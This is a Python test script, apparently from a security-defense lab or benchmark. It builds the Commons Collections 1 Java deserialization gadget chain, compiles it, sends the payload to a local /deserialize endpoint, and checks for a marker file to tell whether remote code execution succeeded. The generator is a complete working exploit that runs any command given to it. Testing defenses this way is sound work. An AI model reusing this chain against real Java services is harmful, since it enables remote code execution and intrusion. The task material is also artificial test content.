#!/usr/bin/env python3
"""CC1 Deserialization exploit - tests CommonsCollections1 chain via /deserialize.

Generates a CC1 payload using the JDK in the container, base64 encodes it, sends
to the vulnerable endpoint, and checks if RCE was achieved (side-effect file).

Returns 0 if attack succeeds (defense failed), non-zero if blocked (defense holds).
"""
import argparse
import base64
import os
import subprocess
import sys
import tempfile
import urllib.request

MARKER = '/tmp/cc1_pwned'

CC1_SRC = '''
import java.io.*;
import java.lang.reflect.*;
import java.util.*;
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.*;

public class GenCC1 {
    public static void main(String[] args) throws Exception {
        String cmd = args[0];

        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec",
                new Class[]{String.class},
                new Object[]{cmd})
        };

        ChainedTransformer chain = new ChainedTransformer(transformers);
        Map lazyMap = LazyMap.decorate(new HashMap(), chain);

        Constructor<?> ctor = Class.forName(
            "sun.reflect.annotation.AnnotationInvocationHandler")
            .getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler)
            ctor.newInstance(Override.class, lazyMap);

        Map proxyMap = (Map) Proxy.newProxyInstance(
            Map.class.getClassLoader(), new Class[]{Map.class}, handler);

        Object finalHandler = ctor.newInstance(Override.class, proxyMap);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(finalHandler);
        oos.close();

        System.out.write(baos.toByteArray());
        System.out.flush();
    }
}
'''


def find_cc_jar():
    """Locate commons-collections jar in Tomcat webapp."""
    search_paths = [
        '/opt/tomcat/webapps/ROOT/WEB-INF/lib',
        '/opt/tomcat/lib',
        '/usr/local/tomcat/webapps/ROOT/WEB-INF/lib',
        '/usr/local/tomcat/lib',
    ]
    for path in search_paths:
        if os.path.isdir(path):
            for f in os.listdir(path):
                if 'commons-collections' in f.lower() and f.endswith('.jar'):
                    return os.path.join(path, f)

    # Fallback: recursive search across common Tomcat roots
    for base in ['/opt/tomcat', '/usr/local/tomcat']:
        if os.path.isdir(base):
            for root, dirs, files in os.walk(base):
                for f in files:
                    if 'commons-collections' in f.lower() and f.endswith('.jar'):
                        return os.path.join(root, f)
    return None


def generate_payload(cmd: str) -> bytes:
    """Generate a CC1 serialized payload using the container's JDK."""
    cc_jar = find_cc_jar()
    if not cc_jar:
        print('[exp] commons-collections jar not found')
        return b''

    tmp = tempfile.mkdtemp()
    src_file = os.path.join(tmp, 'GenCC1.java')

    try:
        with open(src_file, 'w') as f:
            f.write(CC1_SRC)

        # Compile
        ret = subprocess.run(
            ['javac', '-cp', cc_jar, src_file],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=30)
        if ret.returncode != 0:
            print(f'[exp] compile failed: {ret.stderr.decode(errors="replace")[:200]}')
            return b''

        # Run
        ret = subprocess.run(
            ['java', '-cp', f'{tmp}:{cc_jar}', 'GenCC1', cmd],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
        if ret.returncode != 0:
            print(f'[exp] payload generation failed: {ret.stderr.decode(errors="replace")[:200]}')
            return b''

        return ret.stdout
    finally:
        for f in os.listdir(tmp):
            os.remove(os.path.join(tmp, f))
        os.rmdir(tmp)


def health_check(base):
    """Check service is up and Tomcat /deserialize endpoint is reachable."""
    ok = True
    try:
        resp = urllib.request.urlopen(base, timeout=10)
        body = resp.read().decode()
        print(f'[health] main page OK ({resp.status}, {len(body)} bytes)')
    except Exception as e:
        print(f'[health] FAILED: main page ({e})')
        ok = False

    try:
        resp = urllib.request.urlopen(f'{base}/deserialize', timeout=10)
    except urllib.error.HTTPError as e:
        if e.code == 405:
            print('[health] /deserialize endpoint OK (405 = alive, waiting for POST)')
        else:
            print(f'[health] WARNING: /deserialize returned {e.code}')
            ok = False
    except Exception as e:
        print(f'[health] /deserialize check skipped ({e})')

    return ok


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', default='http://127.0.0.1')
    args = parser.parse_args()
    base = args.target.rstrip('/')

    health_check(base)

    # Generate CC1 payload that creates a marker file
    print('[exp] generating CC1 payload...')
    payload = generate_payload(f'touch {MARKER}')
    if not payload:
        print('[exp] FAILED: could not generate CC1 payload')
        sys.exit(1)
    print(f'[exp] payload generated ({len(payload)} bytes)')

    # Remove marker if it already exists
    try:
        os.remove(MARKER)
    except FileNotFoundError:
        pass

    # Base64 encode the payload and send as text
    b64_payload = base64.b64encode(payload).decode()
    print(f'[exp] sending base64 payload ({len(b64_payload)} chars)...')
    try:
        req = urllib.request.Request(
            f'{base}/deserialize',
            data=b64_payload.encode(),
            headers={'Content-Type': 'text/plain'})
        resp = urllib.request.urlopen(req, timeout=15)
        print(f'[exp] server responded: {resp.status} - {resp.read().decode(errors="replace")[:200]}')
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors='replace')[:200]
        safe = body.encode('ascii', errors='replace').decode()
        print(f'[exp] server response: {e.code} - {safe}')
    except Exception as e:
        print(f'[exp] request failed: {e}')

    # Check if RCE was achieved
    if os.path.exists(MARKER):
        print('[exp] CC1 deserialization works -- RCE achieved, attack succeeds')
        sys.exit(0)
    else:
        print('[exp] Deserialization blocked or payload failed -- defense holds')
        sys.exit(1)


if __name__ == '__main__':
    main()
